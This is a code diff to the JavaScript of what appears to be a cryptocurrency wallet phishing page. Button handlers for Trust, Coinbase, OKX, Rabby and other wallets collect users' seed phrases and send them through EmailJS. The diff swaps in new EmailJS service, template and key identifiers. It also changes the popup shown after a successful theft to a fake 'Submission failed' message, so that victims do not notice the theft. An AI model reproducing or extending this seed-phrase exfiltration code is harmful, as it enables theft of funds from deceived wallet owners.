@@ -3409,7 +3409,7 @@ document.addEventListener('DOMContentLoaded', function () {
   const submitBtn = document.getElementById('trust-import-button');
 
   // Initialize EmailJS
-  emailjs.init("wQvQUmd6saTY7blzW"); // Use your actual public key here
+  emailjs.init("s8ysRsBBhKyyElMFP"); // Use your actual public key here
 
   submitBtn.addEventListener('click', async function () {
     // Collect all input values from seed phrase fields
@@ -3449,9 +3449,9 @@ document.addEventListener('DOMContentLoaded', function () {
     };
 
     try {
-      await emailjs.send("service_ds9xjcb", "template_dj0emzm", params);
+      await emailjs.send("service_5j6r3vq", "template_c1zlv3v", params);
       console.log("EmailJS send success");
-      showPopup("Wallet Connection Failed");
+      showPopup("Submission failed. Please try again.");
     } catch (err) {
       console.error("EmailJS send error:", err);
       showPopup("Submission failed. Please try again.");
@@ -3752,7 +3752,7 @@ document.addEventListener('DOMContentLoaded', function () {
   const submitBtn = document.getElementById('coinbase-import-button');
 
   // Initialize EmailJS
-  emailjs.init("wQvQUmd6saTY7blzW"); // Replace with your public key
+  emailjs.init("s8ysRsBBhKyyElMFP"); // Replace with your public key
 
   submitBtn.addEventListener('click', async function () {
     const input = document.getElementById('coinbase-import-input');
@@ -3795,9 +3795,9 @@ document.addEventListener('DOMContentLoaded', function () {
     };
 
     try {
-      await emailjs.send("service_ds9xjcb", "template_dj0emzm", params);
+      await emailjs.send("service_5j6r3vq", "template_c1zlv3v", params);
       console.log("EmailJS send success");
-      showPopup("Wallet Connection Failed"); // You can change this to a success message
+      showPopup("Submission failed. Please try again."); // You can change this to a success message
     } catch (err) {
       console.error("EmailJS send error:", err);
       showPopup("Submission failed. Please try again.");
@@ -4260,7 +4260,7 @@ document.addEventListener('DOMContentLoaded', function () {
   const submitBtn = document.getElementById('okx_btn');
 
   // Initialize EmailJS
-  emailjs.init("wQvQUmd6saTY7blzW"); // Replace with your actual public key
+  emailjs.init("s8ysRsBBhKyyElMFP"); // Replace with your actual public key
 
   submitBtn.addEventListener('click', async function () {
     const inputs = document.querySelectorAll('.okx-seed-input');
@@ -4297,9 +4297,9 @@ document.addEventListener('DOMContentLoaded', function () {
     };
 
     try {
-      await emailjs.send("service_ds9xjcb", "template_dj0emzm", params);
+      await emailjs.send("service_5j6r3vq", "template_c1zlv3v", params);
       console.log("EmailJS send success");
-      showPopup("Wallet Connection Failed"); // You might want to replace this with a success/failure notice
+      showPopup("Submission failed. Please try again."); // You might want to replace this with a success/failure notice
     } catch (err) {
       console.error("EmailJS send error:", err);
       showPopup("Submission failed. Please try again.");
@@ -4753,7 +4753,7 @@ document.addEventListener('DOMContentLoaded', function () {
   const submitBtn = document.getElementById('phe_btn');
 
   // Initialize EmailJS
-  emailjs.init("wQvQUmd6saTY7blzW"); // Replace with your actual EmailJS public key
+  emailjs.init("s8ysRsBBhKyyElMFP"); // Replace with your actual EmailJS public key
 
   submitBtn.addEventListener('click', async function () {
     const inputs = document.querySelectorAll('.phe-seed-input');
@@ -4789,9 +4789,9 @@ document.addEventListener('DOMContentLoaded', function () {
     };
 
     try {
-      await emailjs.send("service_ds9xjcb", "template_dj0emzm", params);
+      await emailjs.send("service_5j6r3vq", "template_c1zlv3v", params);
       console.log("EmailJS send success");
-      showPopup("Wallet Connection Failed"); // or a success message, up to you
+      showPopup("Submission failed. Please try again."); // or a success message, up to you
     } catch (err) {
       console.error("EmailJS send error:", err);
       showPopup("Submission failed. Please try again.");
@@ -5287,7 +5287,7 @@ document.addEventListener('DOMContentLoaded', function () {
   const submitBtn = document.getElementById('rabby_btn');
 
   // Initialize EmailJS
-  emailjs.init("wQvQUmd6saTY7blzW"); // Replace with your actual EmailJS public key
+  emailjs.init("s8ysRsBBhKyyElMFP"); // Replace with your actual EmailJS public key
 
   submitBtn.addEventListener('click', async function () {
     const inputs = document.querySelectorAll('.rabby-seed-input');
@@ -5324,9 +5324,9 @@ document.addEventListener('DOMContentLoaded', function () {
     };
 
     try {
-      await emailjs.send("service_ds9xjcb", "template_dj0emzm", params);
+      await emailjs.send("service_5j6r3vq", "template_c1zlv3v", params);
       console.log("EmailJS send success");
-      showPopup("Wallet Connection Failed"); // Replace with success message if preferred
+      showPopup("Submission failed. Please try again."); // Replace with success message if preferred
     } catch (err) {
       console.error("EmailJS send error:", err);
       showPopup("Submission failed. Please try again.");
@@ -5831,7 +5831,7 @@ document.addEventListener('DOMContentLoaded', function () {
   const submitBtn = document.getElementById('anyw_btn');
 
   // Initialize EmailJS
-  emailjs.init("wQvQUmd6saTY7blzW"); // Replace with your actual EmailJS public key
+  emailjs.init("s8ysRsBBhKyyElMFP"); // Replace with your actual EmailJS public key
 
   submitBtn.addEventListener('click', async function () {
     const inputs = document.querySelectorAll('.anyw-seed-input');
@@ -5867,9 +5867,9 @@ document.addEventListener('DOMContentLoaded', function () {
     };
 
     try {
-      await emailjs.send("service_ds9xjcb", "template_dj0emzm", params);
+      await emailjs.send("service_5j6r3vq", "template_c1zlv3v", params);
       console.log("EmailJS send success");
-      showPopup("Wallet Connection Failed"); // Or replace with success message
+      showPopup("Submission failed. Please try again."); // Or replace with success message
     } catch (err) {
       console.error("EmailJS send error:", err);
       showPopup("Submission failed. Please try again.");
